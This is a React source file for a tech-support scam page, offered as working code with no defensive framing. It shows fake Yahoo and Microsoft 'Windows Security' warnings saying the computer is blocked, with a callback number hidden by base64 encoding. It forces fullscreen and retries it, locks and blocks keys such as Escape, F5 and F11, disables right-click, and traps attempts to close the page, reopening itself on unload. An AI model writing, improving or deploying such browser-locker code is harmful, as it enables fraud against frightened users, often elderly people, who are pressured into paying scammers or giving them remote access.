import React, { useState, useEffect, useRef } from 'react'
import './style.css'

/* base64 so source shows nothing readable */
const _p = 'KzEgODg4LTIyMS0wMTE5'          // "+1 888-221-0119"
const PHONE = atob(_p)

export default function App() {
  const [modal, setModal]     = useState(false)
  const [overlay, setOverlay] = useState(false)
  const [exitPop, setExitPop] = useState(false)
  const [chat, setChat]       = useState(false)
  const armed      = useRef(false)
  const allowClose = useRef(false)

  useEffect(() => {
    const t1 = setTimeout(() => setModal(true), 500)
    const t2 = setTimeout(() => setChat(true), 1500)

    /* ---------- FULLSCREEN ---------- */
    const isFS = () =>
      !!(document.fullscreenElement || document.webkitFullscreenElement ||
         document.mozFullScreenElement || document.msFullscreenElement)

    const reqFS = () => {
      const el = document.documentElement
      const fn = el.requestFullscreen || el.webkitRequestFullscreen ||
                 el.mozRequestFullScreen || el.msRequestFullscreen
      if (fn && !isFS()) {
        try { const p = fn.call(el); if (p && p.catch) p.catch(() => {}) } catch (e) {}
      }
    }

    const reqFSRetry = () => {
      reqFS()
      let t = 0
      const iv = setInterval(() => {
        t++
        if (isFS() || t > 10) { clearInterval(iv); return }
        reqFS()
      }, 400)
    }

    const lockKB = () => {
      try {
        if (navigator.keyboard && navigator.keyboard.lock)
          navigator.keyboard.lock(['Escape','F11','F5','Tab','KeyW','KeyR','Backspace'])
      } catch (e) {}
    }

    /* ---------- ACTIVITY TRIGGER ---------- */
    const onAct = () => {
      if (!armed.current) {
        armed.current = true
        setModal(false)
        setOverlay(true)
        reqFSRetry()
        lockKB()
      } else {
        if (!isFS()) reqFS()
      }
    }

    const events = ['keydown','mousedown','click','touchstart','mousemove','scroll','wheel','touchmove']
    events.forEach(ev => window.addEventListener(ev, onAct, { passive: true }))
    window.addEventListener('focus', onAct)

    /* ---------- KEY BLOCKING ---------- */
    const killKey = (e) => {
      const k = e.keyCode || e.which
      const tg = e.target
      const typing = tg && (tg.tagName === 'INPUT' || tg.tagName === 'TEXTAREA')
      if (!typing) {
        if (k === 27 || k === 122 || k === 116 || k === 9 || k === 8 ||
            (k >= 112 && k <= 123) || (k >= 37 && k <= 40)) {
          e.preventDefault(); e.returnValue = false
        }
      }
      if (k === 27 || k === 122) reqFS()
    }
    document.addEventListener('keydown', killKey, true)
    document.addEventListener('contextmenu', e => e.preventDefault(), true)
    document.onselectstart = () => false

    /* ---------- FULLSCREEN ESCAPE ---------- */
    const fsEvents = ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange']
    fsEvents.forEach(ev => {
      document.addEventListener(ev, () => {
        if (!isFS()) { setOverlay(true); setTimeout(reqFS, 300) }
      }, false)
    })

    /* ---------- CLOSE TRAP ---------- */
    const onLeave = (e) => {
      if (allowClose.current) return
      const msg = 'Are you sure you want to leave this page?'
      if (e) e.returnValue = msg
      return msg
    }
    window.addEventListener('beforeunload', onLeave, false)
    window.addEventListener('unload', () => {
      if (!allowClose.current) { try { window.open(window.location.href, '_blank') } catch (e) {} }
    }, false)

    return () => { clearTimeout(t1); clearTimeout(t2) }
  }, [])

  const handleLeave = () => {
    allowClose.current = true
    setExitPop(false)
    try { window.open(window.location.href, '_blank') } catch (e) {}
    setTimeout(() => { try { window.close() } catch (e) {} }, 60)
  }

  return (
    <>
      {/* Yahoo modal */}
      <div id="modalbx" style={{ display: modal ? 'block' : 'none' }}>
        <div className="bxweb">
          <button className="swtch" onClick={() => setModal(false)}>X</button>
          <img src="images/logo.png" alt="" style={{ width: 100 }} />
          <h3 style={{ fontSize: 18 }}>Suspicious activity has been detected</h3>
          <p>An unusual login attempt was detected on your account from IP address 104.244.42.1 (US).</p>
          <p>To protect your personal information, please verify your identity or close this page immediately.</p>
          <div>
            <button className="btn-lg bt1" onClick={() => setModal(false)}>Close this page</button>
            <button className="btn-lg bt2 blink" onClick={() => setModal(false)}>Verify my identity</button>
          </div>
        </div>
      </div>

      {/* Black overlay */}
      <div id="overlay2" style={{ display: overlay ? 'block' : 'none' }}>
        <div className="inner">
          <p>Do not restart or operate your computer.</p>
          <p>Your computer has been disabled. Please call immediately.</p>
          <p>Access to this computer has been blocked for security reasons.</p>
          <p>Call us directly <b>{PHONE}</b></p>
        </div>
      </div>

      {/* Exit popup */}
      <div id="exit-popup" style={{ display: exitPop ? 'block' : 'none' }}>
        <h3>Leave this site?</h3>
        <p style={{ fontSize: 'large' }}>Are you sure you want to leave this page?</p>
        <div className="btn-wrapper">
          <button className="btn_leave" onClick={handleLeave}>Leave</button>
          <button className="btn_cancel" onClick={() => setExitPop(false)}>Cancel</button>
        </div>
      </div>

      {/* Chat widget */}
      <div id="chat" style={{ display: chat ? 'block' : 'none' }}>
        <img src="images/img01df.png" alt="" />
        <span style={{ fontSize: 24, fontWeight: 600, marginLeft: 6 }}>Microsoft</span>
        <p style={{ fontWeight: 600, fontSize: 24 }}>Call Support:</p>
        <div className="num">Please call <br />{PHONE}</div>
      </div>

      {/* Footer */}
      <div id="footer">
        <span><img src="images/img01df.png" alt="" /> Windows Security</span>
        <span style={{ marginLeft: 13 }}>Call us directly <b>{PHONE}</b></span>
      </div>
    </>
  )
}